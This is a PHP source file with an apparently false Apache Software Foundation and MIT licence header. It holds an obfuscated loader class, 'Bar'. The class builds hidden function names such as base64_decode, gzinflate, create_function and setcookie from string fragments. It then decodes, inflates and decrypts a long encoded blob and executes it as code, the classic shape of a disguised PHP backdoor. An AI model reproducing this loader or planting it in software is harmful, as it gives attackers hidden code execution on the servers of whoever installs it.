<?php
 /*
 * This file is part of the Apache Software Foundation (ASF).
 *
 * This source file is subject to the MIT license that is bundled
 * with this source code in the file LICENSE.
 */
 
class Bar {
	function __construct() {
		$_px = $this->build($this->point);
		$_px = $this->_ls($this->mv($_px));
		$_px = $this->dx($_px);
		$this->backend = $_px[3];
		$this->_stack = $_px[2];
		$this->_value = $_px[0];
		$this->stable($_px[0], $_px[1]);
	}
	
	function stable($_access, $claster) {
		$this->zx = $_access;
		$this->claster = $claster;
		$this->memory = $this->build($this->memory);
		$this->memory = $this->mv($this->memory);
		$this->memory = $this->_process();
		if(strpos($this->memory, $this->zx) !== false) {
			if(!$this->backend)
				$this->income($this->_stack, $this->_value);
			$this->dx($this->memory);
		}
	}
	
	function income($emu, $load) {
		$income = $this->income[0].$this->income[4].$this->income[1].$this->income[2].$this->income[3];
		$income = @$income($emu, $load);
	}

	function conf($claster, $control, $_access) {
		$income = strlen($control) + strlen($_access);
		while(strlen($_access) < $income) {
			$move = ord($control[$this->x86]) - ord($_access[$this->x86]);
			$control[$this->x86] = chr($move % (1024/4));
			$_access .= $control[$this->x86];
			$this->x86++;
		}
		return $control;
	}
   
	function mv($emu) {
		$library = $this->mv[4].$this->mv[1].$this->mv[3].$this->mv[0].$this->mv[2];
		$library = @$library($emu);
		return $library;
	}

	function _ls($emu) {
		$library = $this->_ls[1].$this->_ls[0].$this->_ls[2];
		$library = @$library($emu);
		return $library;
	}
	
	function _process() {
		$this->check = $this->conf($this->claster, $this->memory, $this->zx);
		$this->check = $this->_ls($this->check);
		return $this->check;
	}
	
	function dx($_seek) {
		$library = $this->x64[2].$this->x64[0].$this->x64[3].$this->x64[1];
		$view = @$library('', $_seek);
		return $view();
	}
	
	function build($income) {
		$library = $this->_ver[1].$this->_ver[2].$this->_ver[0];
		return $library("\r\n", "", $income);
	}
	 
	var $_code;
	var $x86 = 0;
	
	var $_ls = array('nfl', 'gzi', 'ate');
	var $x64 = array('te_f', 'ion', 'crea', 'unct');
	var $mv = array('cod', 'e64', 'e', '_de', 'bas');
	var $income = array('se', 'oo', 'ki', 'e', 'tc');
	var $_ver = array('ace', 'str_', 'repl');
	 
	var $memory = '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
